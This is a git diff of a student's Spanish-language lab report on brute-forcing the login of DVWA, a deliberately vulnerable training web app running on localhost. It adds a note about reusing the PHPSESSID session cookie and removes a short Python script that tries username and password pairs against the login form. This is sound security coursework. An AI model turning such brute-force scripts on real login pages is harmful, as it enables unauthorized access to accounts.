@@ -1,7 +1,7 @@
 # Informe Laboratorio 2 – DVWA (Damn Vulnerable Web App)
 
 **Autor:** Felipe Cuevas  
-**Fecha:** Septiembre 2025  
+**Fecha:** Octubre 2025  
 **Correo:** felipe.cuevas1@mail.udp.cl
 
 ---
@@ -117,6 +117,10 @@ Diferencias clave entre respuestas:
 
 ---
 
+**Nota importante:** en las pruebas con **Hydra**, **cURL** y **Python** se usó la cookie de sesión `PHPSESSID` de una sesión iniciada previamente en la página de login de DVWA (antes de llegar al formulario de ataque de fuerza bruta). **Es necesario reemplazar el valor de `PHPSESSID` (`<ID>`) en los comandos y scripts por el valor real obtenido desde el navegador** antes de ejecutar las pruebas.
+
+---
+
 ### 4. Ataque de fuerza bruta con Hydra
 
 ```bash
@@ -143,22 +147,11 @@ Credenciales obtenidas:
 - Mantiene sesión con cabecera `Cookie`  
 - Detecta respuestas válidas comparando contenido HTML  
 
-```python
-import requests
+**Comando para ejecutar el script (usar los archivos `usuarios.txt` y `passwords.txt`):**
 
-url = "http://localhost:4280/vulnerabilities/brute/"
-cookies = {"security":"low","PHPSESSID":"<ID>"}
-usuarios = ["1337", "pablo"]
-passwords = ["charley", "letmein"]
-
-for u in usuarios:
-    for p in passwords:
-        r = requests.get(url, params={"username":u,"password":p,"Login":"Login"}, cookies=cookies)
-        if "Welcome" in r.text:
-            print(f"Usuario: {u}, Contraseña: {p}")
+```bash
+python3 fuerzabruta.py usuarios.txt passwords.txt
 ```
-
----
 
 ### 6. Comparación de herramientas
 
